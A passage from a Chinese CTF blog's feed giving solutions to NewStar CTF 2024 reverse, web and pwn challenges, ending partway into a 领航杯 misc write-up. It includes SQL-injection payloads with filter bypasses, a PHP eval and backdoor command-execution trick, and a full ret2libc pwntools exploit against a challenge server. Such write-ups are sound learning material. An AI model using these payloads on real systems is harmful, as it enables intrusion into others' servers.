class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span>* v, <span class="hljs-type">uint32_t</span>* k)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>];<br>    <span class="hljs-type">uint32_t</span> sum = <span class="hljs-number">0xC6EF3720</span>;  <span class="hljs-comment">// 0x9E3779B9 * 32</span><br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x9E3779B9</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        v1 -= ((v0 &lt;&lt; <span class="hljs-number">4</span>) + k[<span class="hljs-number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k[<span class="hljs-number">3</span>]);<br>        v0 -= ((v1 &lt;&lt; <span class="hljs-number">4</span>) + k[<span class="hljs-number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k[<span class="hljs-number">1</span>]);<br>        sum -= delta;<br>    &#125;<br><br>    v[<span class="hljs-number">0</span>] = v0;<br>    v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> key[] = <span class="hljs-string">&quot;WelcomeToNewStar&quot;</span>;<br>    <span class="hljs-type">uint8_t</span> enc[] = &#123; <span class="hljs-number">120</span>, <span class="hljs-number">32</span>, <span class="hljs-number">247</span>, <span class="hljs-number">179</span>, <span class="hljs-number">197</span>, <span class="hljs-number">66</span>, <span class="hljs-number">206</span>, <span class="hljs-number">218</span>, <br>                      <span class="hljs-number">133</span>, <span class="hljs-number">89</span>, <span class="hljs-number">33</span>, <span class="hljs-number">26</span>, <span class="hljs-number">38</span>, <span class="hljs-number">86</span>, <span class="hljs-number">90</span>, <span class="hljs-number">89</span>, <br>                      <span class="hljs-number">41</span>, <span class="hljs-number">2</span>, <span class="hljs-number">13</span>, <span class="hljs-number">237</span>, <span class="hljs-number">7</span>, <span class="hljs-number">168</span>, <span class="hljs-number">185</span>, <span class="hljs-number">238</span>, <br>                      <span class="hljs-number">54</span>, <span class="hljs-number">89</span>, <span class="hljs-number">17</span>, <span class="hljs-number">135</span>, <span class="hljs-number">253</span>, <span class="hljs-number">92</span>, <span class="hljs-number">35</span>, <span class="hljs-number">36</span> &#125;;<br><br>    <span class="hljs-comment">// 将密钥转换为 uint32 列表</span><br>    <span class="hljs-type">uint32_t</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">memcpy</span>(k, key, <span class="hljs-keyword">sizeof</span>(k));<br><br>    <span class="hljs-comment">// 每8字节（两个 uint32）进行解密</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(enc); i += <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>];<br>        <span class="hljs-built_in">memcpy</span>(v, enc + i, <span class="hljs-keyword">sizeof</span>(v));<br>        decrypt(v, k);<br>        <br>        <span class="hljs-comment">// 检查解密后的值</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Decrypted values: %u %u\n&quot;</span>, v[<span class="hljs-number">0</span>], v[<span class="hljs-number">1</span>]);<br><br>        <span class="hljs-comment">// 更新加密数组</span><br>        <span class="hljs-built_in">memcpy</span>(enc + i, v, <span class="hljs-keyword">sizeof</span>(v));<br>    &#125;<br><br>    <span class="hljs-comment">// 输出解密后的结果</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(enc); i++) &#123;<br>        <span class="hljs-keyword">if</span> (enc[i] &gt;= <span class="hljs-number">32</span> &amp;&amp; enc[i] &lt; <span class="hljs-number">127</span>) &#123;<br>            <span class="hljs-built_in">putchar</span>(enc[i]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;\n&#x27;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Dirty-flowers"><a href="#Dirty-flowers" class="headerlink" title="Dirty_flowers"></a>Dirty_flowers</h3><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs maxima">def decrypt(v3, <span class="hljs-built_in">key</span>):<br>    decrypted = []<br>    key_length = len(<span class="hljs-built_in">key</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(len(v3)):<br>        decrypted_char = v3[i] ^ ord(<span class="hljs-built_in">key</span>[i <span class="hljs-symbol">%</span> key_length])<br>        decrypted.<span class="hljs-built_in">append</span>(decrypted_char)<br>    <span class="hljs-built_in">return</span> decrypted<br>v3 = [<br>    <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">19</span>, <span class="hljs-number">19</span>, <span class="hljs-number">2</span>, <span class="hljs-number">30</span>, <span class="hljs-number">83</span>, <span class="hljs-number">31</span>, <span class="hljs-number">92</span>, <span class="hljs-number">26</span>,<br>    <span class="hljs-number">39</span>, <span class="hljs-number">67</span>, <span class="hljs-number">29</span>, <span class="hljs-number">54</span>, <span class="hljs-number">67</span>, <span class="hljs-number">7</span>, <span class="hljs-number">38</span>, <span class="hljs-number">45</span>, <span class="hljs-number">85</span>, <span class="hljs-number">13</span>,<br>    <span class="hljs-number">3</span>, <span class="hljs-number">27</span>, <span class="hljs-number">28</span>, <span class="hljs-number">45</span>, <span class="hljs-number">2</span>, <span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">56</span>, <span class="hljs-number">50</span>,<br>    <span class="hljs-number">85</span>, <span class="hljs-number">2</span>, <span class="hljs-number">27</span>, <span class="hljs-number">22</span>, <span class="hljs-number">84</span>, <span class="hljs-number">15</span><br>]<br><span class="hljs-built_in">key</span> = <span class="hljs-string">&quot;dirty_flower&quot;</span><br>decrypted_values = decrypt(v3, <span class="hljs-built_in">key</span>)<br>flag = &#x27;&#x27;.<span class="hljs-built_in">join</span>(chr(<span class="hljs-built_in">num</span>) <span class="hljs-keyword">for</span> <span class="hljs-built_in">num</span> <span class="hljs-keyword">in</span> decrypted_values)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="你能在一秒内打出八句英文吗"><a href="#你能在一秒内打出八句英文吗" class="headerlink" title="你能在一秒内打出八句英文吗"></a>你能在一秒内打出八句英文吗</h3><p>简单分析一下前端后写个py发包就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>session = requests.Session()<br>url = <span class="hljs-string">&#x27;http://eci-2zeefa47o1td1sssj8ml.cloudeci1.ichunqiu.com/start&#x27;</span><br>res = session.get(url)<br><br>soup = BeautifulSoup(res.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>text = soup.find(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;text&#x27;</span>).get_text()<br>user_input = text<br><br>post_url = <span class="hljs-string">&#x27;http://eci-2zeefa47o1td1sssj8ml.cloudeci1.ichunqiu.com/submit&#x27;</span><br>data = &#123;<span class="hljs-string">&#x27;user_input&#x27;</span>: user_input&#125; <br><br><span class="hljs-comment"># 发送 POST 请求</span><br>response = session.post(post_url, data=data)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><h3 id="遗失的拉链"><a href="#遗失的拉链" class="headerlink" title="遗失的拉链"></a>遗失的拉链</h3><p>根据题目的提示应该是<a href="http://www.zip下载看一下pizwww.php/">www.zip下载看一下pizwww.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//for fun</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;new&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;star&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;new&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;star&#x27;</span>])&amp;&amp;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;new&#x27;</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;star&#x27;</span>])&#123;<br>        <span class="hljs-comment">//欸 为啥sha1和md5相等呢</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|flag/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;u can not do this &quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Wrong&quot;</span>;<br><br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure><p>用数组绕过就行了</p><p>然后执行system(‘tac &#x2F;f*’)就可以了</p><h3 id="谢谢皮蛋-plus"><a href="#谢谢皮蛋-plus" class="headerlink" title="谢谢皮蛋 plus"></a>谢谢皮蛋 plus</h3><p>过滤了空格，是字符绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-1<span class="hljs-string">&quot;/**/union/**/select/**/1,database()#</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-1<span class="hljs-string">&quot;/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()#</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-1<span class="hljs-string">&quot;/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;Fl4g&#x27;#</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-1<span class="hljs-string">&quot;/**/union/**/select/**/1,group_concat(id,des,value)/**/from/**/Fl4g#</span><br></code></pre></td></tr></table></figure><h3 id="复读机"><a href="#复读机" class="headerlink" title="复读机"></a>复读机</h3><p>简单测试了一下xss和ssti，发现是ssti，但是手测不出来禁了什么，fenjing一把梭吧</p><p><img src="/../../images/Newstar/2024/30.png" alt="30"></p><h3 id="PangBai-过家家（2）"><a href="#PangBai-过家家（2）" class="headerlink" title="PangBai 过家家（2）"></a>PangBai 过家家（2）</h3><p>git泄露找了好几个版本，用<a href="https://github.com/WangYihang/GitHacker%E8%BF%99%E4%B8%AA%E7%89%88%E6%9C%AC%E7%9A%84%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0">https://github.com/WangYihang/GitHacker这个版本的可以得到</a></p><p><img src="/../../images/Newstar/2024/32.png" alt="32"></p><p>也git下来，git add一下得到一个文件BacKd0or.v2d23AOPpDfEW5Ca.php,看一下内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment"># Functions to handle HTML output</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">print_msg</span>(<span class="hljs-params"><span class="hljs-variable">$msg</span></span>) </span>&#123;<br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;index.html&#x27;</span>);<br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/\s*&lt;script.*&lt;\/script&gt;/s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$content</span>);<br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/ event/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$content</span>);<br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;点击此处载入存档&#x27;</span>, <span class="hljs-variable">$msg</span>, <span class="hljs-variable">$content</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_backdoor</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;index.html&#x27;</span>);<br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;/assets/index.4f73d116116831ef.js&#x27;</span>,<br><span class="hljs-string">&#x27;/assets/backdoor.5b55c904b31db48d.js&#x27;</span>, <span class="hljs-variable">$content</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>&#125;<br><span class="hljs-comment"># Backdoor</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;papa&#x27;</span>] !== <span class="hljs-string">&#x27;TfflxoU0ry7c&#x27;</span>) &#123;<br><span class="hljs-title function_ invoke__">show_backdoor</span>();<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NewStar_CTF.2024&#x27;</span>] !== <span class="hljs-string">&#x27;Welcome&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^Welcome$/&#x27;</span>,<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NewStar_CTF.2024&#x27;</span>])) &#123;<br><span class="hljs-title function_ invoke__">print_msg</span>(<span class="hljs-string">&#x27;PangBai loves you!&#x27;</span>);<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;func&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;args&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-title function_ invoke__">print_msg</span>(<span class="hljs-string">&#x27;PangBai hates you!&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>分析一下get需要发包的为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">NewStar[CTF.2024=Welcome%0a<br></code></pre></td></tr></table></figure><p>需要进行截取，然后还有个php特性的问题</p><p>post发包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">papa=TfflxoU0ry7c&amp;func=system&amp;args=<span class="hljs-built_in">set</span><br></code></pre></td></tr></table></figure><p>call_user_func是构造函数，查看系统环境得到flag</p><p><img src="/../../images/Newstar/2024/33.png" alt="33"></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="ez-game"><a href="#ez-game" class="headerlink" title="ez_game"></a>ez_game</h3><p>用checksec检查一下，发现是64位，开了NX保护F5弹出伪代码，看一下。在func函数中发现溢出点</p><p>没有system字符串，也没有bin&#x2F;sh,同时也开启了NX保护，说明是ret2libcROPgadget –binary ‘attachment’ –only ‘pop|ret’ 查看rdi与ret的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;101.200.139.65&#x27;</span>,<span class="hljs-number">30806</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./a&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br>rdi=<span class="hljs-number">0x400783</span><br>ret=<span class="hljs-number">0x400509</span><br>main=<span class="hljs-number">0x400702</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>payload1=<span class="hljs-string">b&quot;\x00&quot;</span>.ljust(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">&#x27;Welcome to NewStarCTF!!!!&#x27;</span>)<br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libcbase = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sys = libcbase + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libcbase + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(sys))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(binsh))<br>payload2 = <span class="hljs-string">b&quot;\x00&quot;</span>.ljust(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;a&#x27;</span>) + p64(ret) + p64(rdi) + p64(binsh) + p64(sys)<br><br><br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/../../images/Newstar/2024/31.png" alt="31"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024年领航杯初赛</title>
    <link href="/2024/10/13/%E9%A2%86%E8%88%AA%E6%9D%AF/2024%E5%B9%B4%E9%A2%86%E8%88%AA%E6%9D%AF%E5%88%9D%E8%B5%9B/"/>
    <url>/2024/10/13/%E9%A2%86%E8%88%AA%E6%9D%AF/2024%E5%B9%B4%E9%A2%86%E8%88%AA%E6%9D%AF%E5%88%9D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>团队最后获得比赛第七，简单记录一下内容部分题解是直接粘贴可能不详细。</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>扫二维码发送flag得到flag，就不截图了。hex转化</p><h3 id="seeme"><a href="#seeme" class="headerlink" title="seeme"></a>seeme</h3><p>给了一个文件告诉的是一堆255的信息，敏感的察觉可能和色有关最大255，尝试写脚本爆破，在120和511附件可以明显看到有文字的存在，在这附件开始爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image, ImageEnhance<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_pixel_values_from_file</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        pixel_values = []<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:<br>            values = line.strip().split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(values) != <span class="hljs-number">3</span>:<br>                <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">f&quot;每行必须包含 3 个值。错误行: <span class="hljs-subst">&#123;line&#125;</span>&quot;</span>)<br>            pixel_values.extend(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, values))<br>    <span class="hljs-keyword">return</span> pixel_values<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_image_from_pixels</span>(<span class="hljs-params">pixel_values, width, height</span>):<br>    expected_pixel_count = width * height * <span class="hljs-number">3</span><br>    actual_pixel_count = <span class="hljs-built_in">len</span>(pixel_values)<br><br>    <span class="hljs-keyword">if</span> actual_pixel_count &gt; expected_pixel_count:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;像素值数量多于要求，截取前 <span class="hljs-subst">&#123;expected_pixel_count&#125;</span> 个像素值...&quot;</span>)<br>        pixel_values = pixel_values[:expected_pixel_count]<br>    <span class="hljs-keyword">elif</span> actual_pixel_count &lt; expected_pixel_count:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;像素值数量少于要求，填充黑色像素...&quot;</span>)<br>        pixel_values.extend([<span class="hljs-number">0</span>] * (expected_pixel_count - actual_pixel_count))<br><br>    pixels = np.array(pixel_values, dtype=np.uint8).reshape((height, width, <span class="hljs-number">3</span>))<br>    image = Image.fromarray(pixels, <span class="hljs-string">&#x27;RGB&#x27;</span>)<br>    <span class="hljs-keyword">return</span> image<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enhance_image</span>(<span class="hljs-params">image</span>):<br>    <span class="hljs-comment"># 调整亮度、对比度和颜色饱和度</span><br>    enhancer = ImageEnhance.Brightness(image)<br>    image = enhancer.enhance(<span class="hljs-number">1.5</span>)  <span class="hljs-comment"># 提高亮度</span><br><br>    enhancer = ImageEnhance.Contrast(image)<br>    image = enhancer.enhance(<span class="hljs-number">1.5</span>)  <span class="hljs-comment"># 提高对比度</span><br><br>    enhancer = ImageEnhance.Color(image)<br>    image = enhancer.enhance(<span class="hljs-number">1.2</span>)  <span class="hljs-comment"># 调整颜色饱和度</span><br><br>    <span class="hljs-keyword">return</span> image<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;欢迎使用像素到图像生成器!&quot;</span>)<br><br>    input_file = <span class="hljs-string">&quot;file.txt&quot;</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;从 <span class="hljs-subst">&#123;input_file&#125;</span> 读取像素值...&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        pixel_values = read_pixel_values_from_file(input_file)<br><br>        total_pixels = <span class="hljs-built_in">len</span>(pixel_values) // <span class="hljs-number">3</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;总像素数: <span class="hljs-subst">&#123;total_pixels&#125;</span>&quot;</span>)<br><br>        <span class="hljs-comment"># 细化爆破 120 附近和 511 附近的宽度</span><br>        refined_resolutions = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">115</span>, <span class="hljs-number">126</span>)) + <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">505</span>, <span class="hljs-number">516</span>))  <span class="hljs-comment"># 细化爆破</span><br><br>        <span class="hljs-keyword">for</span> width <span class="hljs-keyword">in</span> refined_resolutions:<br>            height = total_pixels // width<br>            <span class="hljs-keyword">if</span> width * height &gt; total_pixels:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;跳过 <span class="hljs-subst">&#123;width&#125;</span>x<span class="hljs-subst">&#123;height&#125;</span>，像素数据不足。&quot;</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;生成尺寸为 <span class="hljs-subst">&#123;width&#125;</span>x<span class="hljs-subst">&#123;height&#125;</span> 的图像...&quot;</span>)<br><br>            <span class="hljs-comment"># 创建原始图像</span><br>            image = create_image_from_pixels(pixel_values, width, height)<br><br>            <span class="hljs-comment"># 微调图像</span><br>            enhanced_image = enhance_image(image)<br><br>            <span class="hljs-comment"># 保存增强后的图像</span><br>            output_filename = <span class="hljs-string">f&quot;output_image_<span class="hljs-subst">&#123;width&#125;</span>x<span class="hljs-subst">&#123;height&#125;</span>.png&quot;</span><br>  